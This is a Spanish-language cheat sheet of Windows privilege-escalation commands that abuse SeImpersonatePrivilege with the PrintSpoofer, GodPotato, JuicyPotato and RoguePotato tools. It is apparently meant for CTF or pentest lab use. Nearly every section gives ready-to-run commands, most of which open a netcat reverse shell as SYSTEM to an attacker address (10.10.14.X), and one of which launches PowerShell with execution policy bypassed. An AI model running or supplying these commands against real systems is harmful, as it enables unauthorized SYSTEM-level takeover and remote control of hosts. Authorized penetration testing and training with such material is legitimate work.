# SeImpersonatePrivilege — Escalada de Privilegios

Guía y comandos de explotación para el privilegio `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` en sistemas Windows para elevar privilegios a **NT AUTHORITY\SYSTEM**.

---

## 1. PrintSpoofer
Ideal para **Windows 10**, **Windows Server 2016** y **Windows Server 2019**. Aprovecha el servicio *Print Spooler* mediante tuberías con nombre (Named Pipes).

- **Repositorio:** [artis3n/SeImpersonatePrivilege-PrintSpoofer](https://github.com/artis3n/SeImpersonatePrivilege-PrintSpoofer)

```cmd
:: Shell reversa con Netcat
.\PrintSpoofer64.exe -c "nc64.exe 10.10.14.X 5555 -e cmd"

:: Ejecutar consola CMD como SYSTEM
.\PrintSpoofer64.exe -c "cmd.exe"

:: Sesión interactiva en CMD
.\PrintSpoofer64.exe -i -c "cmd.exe"

:: Ejecutar PowerShell evadiendo directivas de ejecución
.\PrintSpoofer64.exe -c "powershell.exe -ep bypass"
```

---

## 2. GodPotato
Exploit universal y moderno basado en DCOM. Funciona prácticamente en **cualquier versión de Windows** (Windows Server 2012 hasta 2022 y Windows 10/11) con soporte para .NET 3.5 o superior.

- **Repositorio:** [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato/releases)

```cmd
:: Shell reversa interactiva
.\GodPotato.exe -cmd "nc64.exe 10.10.14.X 5555 -e cmd"

:: Verificación rápida de usuario
.\GodPotato.exe -cmd "cmd.exe /c whoami"
```

---

## 3. JuicyPotato
Diseñado para versiones anteriores de Windows (**Windows 7, 8.1, Server 2008 R2 y Server 2012**). Requiere un CLSID válido para el sistema objetivo.

- **Repositorio:** [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/releases)

```cmd
:: Ejecución especificando puerto COM y ruta completa de netcat
.\JuicyPotato64.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c nc64.exe 10.10.14.X 5555 -e cmd" -t *

:: Versión de 32 bits
.\JuicyPotato.exe -l 1337 -p nc64.exe -a "10.10.14.X 5555 -e cmd" -t *
```

---

## 4. RoguePotato
Alternativa a JuicyPotato para **Windows 10** y **Windows Server 2019** donde DCOM fue parcheado para bloquear conexiones locales. Redirige el tráfico OXID hacia un listener controlado en la máquina del atacante.

- **Repositorio:** [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0)

```cmd
:: Ejecutar indicando la IP del atacante para el redirector OXID
.\RoguePotato.exe -r 10.10.14.X -e "nc64.exe 10.10.14.X 5555 -e cmd" -l 1337
```
